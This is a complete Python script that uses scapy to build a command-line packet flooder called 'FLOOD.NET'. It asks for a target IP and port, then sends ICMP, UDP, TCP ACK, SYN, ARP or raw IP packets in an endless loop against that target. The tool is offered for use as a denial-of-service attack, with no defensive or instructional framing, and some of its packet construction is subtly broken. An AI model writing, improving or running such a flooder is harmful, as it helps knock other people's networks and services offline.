import os
from scapy.all import *
import time

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_icmp_packet(target_ip, packet_count):
    packet = IP(dst=target_ip) / ICMP() / Raw(load="Hello, this is an ICMP packet!")
    send(packet, verbose=False)
    packet_count[0] += 1
    print(f"\033[31mFlooding ICMP packet to {target_ip}...\033[0m")

def send_udp_packet(target_ip, target_port, packet_count):
    packet = IP(dst=target_ip) / UDP(dport=target_port, sport=RandShort()) / Raw(load="Hello, this is a UDP packet!")
    send(packet, verbose=False)
    packet_count[0] += 1
    print(f"\033[31mFlooding UDP packet to {target_ip}:{target_port}...\033[0m")

def send_tcp_packet(target_ip, target_port, packet_count):
    packet = IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags='A') / Raw(load="Hello, this is a TCP packet!")
    send(packet, verbose=False)
    packet_count[0] += 1
    print(f"\033[31mFlooding TCP packet to {target_ip}:{target_port}...\033[0m")

def send_syn_packet(target_ip, target_port, packet_count):
    packet = IP(dst=target_ip) / TCP(dport=target_port, sport=RandShort(), flags='S') / Raw(load="Hello, this is a SYN packet!")
    send(packet, verbose=False)
    packet_count[0] += 1
    print(f"\033[31mFlooding SYN packet to {target_ip}:{target_port}...\033[0m")

def send_arp_packet(target_ip, packet_count):
    packet = ARP(pdst=target_ip) / Ether()
    send(packet, verbose=False)
    packet_count[0] += 1
    print(f"\033[31mFlooding ARP request to {target_ip}...\033[0m")

def send_raw_ip_packet(target_ip, packet_count):
    payload = bytes.fromhex("08 00 1f 45 00 01 00 01 00 00 00 00 00 00 00 00" 
                            "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00")
    packet = IP(dst=target_ip) / Raw(load=payload)
    send(packet, verbose=False)
    packet_count[0] += 1
    print(f"\033[31mFlooding Raw IP packet to {target_ip}...\033[0m")

def main():
    clear_terminal()

    ascii_art = (
        "███████ ██       ██████   ██████  ██████     ███    ██ ███████ ████████ \n"
        "██      ██      ██    ██ ██    ██ ██   ██    ████   ██ ██         ██    \n"
        "█████   ██      ██    ██ ██    ██ ██   ██    ██ ██  ██ █████      ██    \n"
        "██      ██      ██    ██ ██    ██ ██   ██    ██  ██ ██ ██         ██    \n"
        "██      ███████  ██████   ██████  ██████  ██ ██   ████ ███████    ██    \n"
    )
    
    print("\033[35m" + ascii_art + "\033[0m")

    print("\033[35mSelect packet type:\033[0m")
    print("\033[35m1. ICMP\033[0m")
    print("\033[35m2. UDP\033[0m")
    print("\033[35m3. TCP\033[0m")
    print("\033[35m4. SYN\033[0m")
    print("\033[35m5. ARP\033[0m")
    print("\033[35m6. Raw IP\033[0m")
    
    packet_type = input("\033[35mEnter the number corresponding to your choice: \033[0m")
    
    target_ip = input("\033[35mEnter the target IP address: \033[0m")

    packet_count = [0]

    if packet_type in ['2', '3', '4', '5', '6']:
        target_port = int(input("\033[35mEnter the target port: \033[0m"))

    try:
        while True:
            if packet_type == '1':
                send_icmp_packet(target_ip, packet_count)
            elif packet_type == '2':
                send_udp_packet(target_ip, target_port, packet_count)
            elif packet_type == '3':
                send_tcp_packet(target_ip, target_port, packet_count)
            elif packet_type == '4':
                send_syn_packet(target_ip, target_port, packet_count)
            elif packet_type == '5':
                send_arp_packet(target_ip, packet_count)
            elif packet_type == '6':
                send_raw_ip_packet(target_ip, packet_count)
            else:
                print("\033[31mInvalid choice. Please select 1, 2, 3, 4, 5, or 6.\033[0m")
                break
            
            time.sleep(0.01)
    except KeyboardInterrupt:
        print(f"\n\033[35mPacket sending stopped. Total packets sent: {packet_count[0]}.\033[0m")

if __name__ == "__main__":
    main()
